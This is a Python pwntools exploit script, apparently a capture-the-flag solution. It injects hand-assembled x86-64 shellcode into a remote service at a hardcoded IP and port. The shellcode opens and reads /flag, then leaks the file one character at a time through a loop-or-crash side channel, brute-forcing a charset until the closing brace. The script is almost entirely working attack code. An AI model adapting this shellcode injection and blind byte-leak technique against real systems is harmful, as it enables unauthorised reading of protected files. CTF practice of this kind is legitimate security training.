#!/usr/bin/env python3
# Date: 2025-07-04 22:24:00

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = 5

# io = process('./pwn')
# io = remote('127.0.0.1', 13337)
elf = ELF('./pwn')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

import string

context.log_level='info'

flag='flag{21869'
idx=10
charset = string.digits+'}{-' + string.ascii_letters
code_addr = 0x4040a0
code=asm('''
         /* open("/flag", 0, 0) */
         mov rax, 2
         mov rdi, 0x4041c0
         mov rsi, 0
         mov rdx, 0
         syscall

         /* read(3, 0x404800, 100) */
         mov rax, 0
         mov rdi, 3
         mov rsi, 0x404800
         mov rdx, 100
         syscall

         add rsi, 0
         mov al, byte ptr [rsi]
         cmp al, 65
         je LOOP
         mov rax, 59
         syscall
    LOOP:
         jmp LOOP  
''')
code = b'H\xc7\xc0\x02\x00\x00\x00H\xc7\xc7\xc0A@\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05H\xc7\xc0\x00\x00\x00\x00H\xc7\xc7\x03\x00\x00\x00H\xc7\xc6\x00H@\x00H\xc7\xc2d\x00\x00\x00\x0f\x05H\x83\xc6\x00\x8a\x06<At\tH\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xfe'

# print(code)
code += b'\x00'*175
code += b'/flag'
code = bytearray(code)
newest='f'
print(charset)
context.log_level='info'
while True:
    if newest == '}':
        break
    code[63] = idx
    for i in charset:
        code[67] = ord(i)
        # io = process('./pwn')
        io = remote("47.113.197.7",35005)
        io.recvline()
        io.send(bytes(code))
        try:
            if b"Bad" in io.recvline(timeout=1):
                raise BaseException()
            flag+=i
            newest = i
            print(flag)
            io.close()
            break
        except BaseException as e:
            io.close()
    idx+=1

print('res : ', flag)
